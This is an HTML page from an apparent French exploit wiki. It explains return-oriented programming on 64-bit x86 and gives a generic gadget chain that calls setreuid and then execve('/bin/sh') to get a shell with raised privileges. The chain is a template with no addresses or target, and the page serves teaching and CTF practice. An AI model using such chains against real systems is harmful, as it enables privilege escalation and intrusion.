<!DOCTYPE html>
<html lang="en">
<head class="page-header" role="banner">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hexwreaker Expoitpedia</title>
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <canvas id="container"></canvas>
    <script src="/script.js"></script>

    <div id="main" class="main-content" role="main">
        <div id="nav-bar">
            <div id="nav-home" class="nav-item"><a href="/"><img src="/src/images/home.jpg"/></a></div>
        </div>
        <h4 id="exploitpedia"><a href="/pages/exploitpedia/exploitpedia">ExploitPedia</a></h4>

<h1 id="rop-x86-64">ROP-x86-64</h1>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cible : x86 64bit
</code></pre></div></div>

<h2 id="présentation">Présentation</h2>

<p>La technique du ROP sur une architecture x86 64 bits est la même que sur 32 bits. Il faut s’appuyer sur des gadgets afin d’exécuter certaines fonction de la libc ou encore des appels systèmes.</p>

<p>Parfois la zone mémoire contrôlée par l’attaquant n’est pas suffisante, c’est pourquoi il peut être utile de “pivoter” dans la pile.</p>

<p>L’exploitation consiste à écrire notre chaîne “ROP” après le buffer, à partir de l’adresse de retour de la fonction main dans la pile.</p>

<p>La chaîne ROP va effectuer 2 appels systèmes :</p>

<ol>
  <li>setreuid(target_uid, target_uid);</li>
  <li>execve(“/bin/sh”, 0, 0);</li>
</ol>

<p>Voici la chaîne ROP qui s’appuie sur des gadgets présent dans le code :</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pop_rdi_ret</span>
<span class="mi">0</span><span class="n">xtarget_uid</span>
<span class="n">pop_rsi_ret</span>
<span class="mi">0</span><span class="n">xtarget_uid</span>
<span class="n">pop_rax_ret</span>
<span class="mh">0x71</span>
<span class="n">syscall_ret</span>
<span class="n">pop_rsi_ret</span>
<span class="err">@</span><span class="n">bss</span>
<span class="n">pop_rax_ret</span>
<span class="n">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span>
<span class="n">mov_prsi_rax_ret</span>
<span class="n">pop_rdi_ret</span>
<span class="err">@</span><span class="n">bss</span>
<span class="n">pop_rsi_ret</span>
<span class="mh">0x0</span>
<span class="n">pop_rdx_ret</span>
<span class="mh">0x0</span>
<span class="n">pop_rax_ret</span>
<span class="mh">0x3b</span>
<span class="n">syscall</span>
</code></pre></div></div>

    </div>
</body>
</html>
